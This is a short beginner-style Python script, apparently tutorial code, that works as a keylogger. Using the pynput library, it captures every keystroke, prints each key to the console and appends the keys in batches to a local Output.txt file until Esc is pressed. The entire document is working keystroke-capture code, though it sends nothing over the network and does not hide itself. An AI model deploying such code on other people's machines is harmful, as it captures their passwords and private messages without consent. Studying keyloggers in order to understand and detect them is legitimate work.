import pynput

from pynput.keyboard import Key, Listener #Listener listens for key events

#want to make sure the program doesnt save the key logs just at the end
#because if the user quits the app in the middle all key logs will be lost
#and so use count and keys list below
count = 0 #every so many keys this will update the .txt file
keys = [] #store keys here

def on_press(key):
    global keys, count
    keys.append(key)
    count +=1
    print("{0} pressed".format(key))

    if count >= 10: #file updated every 10 keys
        count = 0
        write_file(keys)
        keys = []

#write key logs to .txt file
def write_file(keys):
    with open("Output.txt", "a") as f:
#can use "w" if first time running program to create the .txt file
#needs to be "a" after first time running
        for key in keys:
            k = str(key).replace("'", "")
            if k.find("space") > 0: # looks for space in string and if found add an actual space to the line
                f.write('\n')
            elif k.find("Key") == -1:
                    f.write(k)

#breaks out of loop if hit esc key
def on_release(key):
    if key == Key.esc:
        return False


with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join() # constantly runs loop until we break out of it

#